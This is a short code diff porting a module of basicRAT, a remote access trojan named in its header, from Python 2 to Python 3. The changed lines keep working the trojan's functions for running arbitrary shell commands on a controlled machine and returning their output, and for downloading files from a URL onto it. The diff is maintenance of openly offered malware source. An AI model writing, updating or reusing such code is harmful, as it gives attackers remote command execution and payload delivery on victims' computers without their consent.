@@ -1,3 +1,5 @@
+# -*- coding: utf-8 -*-
+
 #
 # basicRAT toolkit module
 # https://github.com/vesche/basicRAT
@@ -7,7 +9,7 @@ import datetime
 import os
 import subprocess
 import sys
-import urllib
+import urllib.request
 import zipfile
 
 
@@ -26,7 +28,8 @@ def execute(command):
     output = subprocess.Popen(command, shell=True,
              stdout=subprocess.PIPE, stderr=subprocess.PIPE,
              stdin=subprocess.PIPE)
-    return output.stdout.read() + output.stderr.read()
+    result = output.stdout.read() + output.stderr.read()
+    return result.decode('utf-8')
 
 
 def ls(path):
@@ -93,7 +96,7 @@ def wget(url):
         fname = 'file-{}'.format(dt)
 
     try:
-        urllib.urlretrieve(url, fname)
+        urllib.request.urlretrieve(url, fname)
     except IOError:
         return 'Error: Download failed.'
 
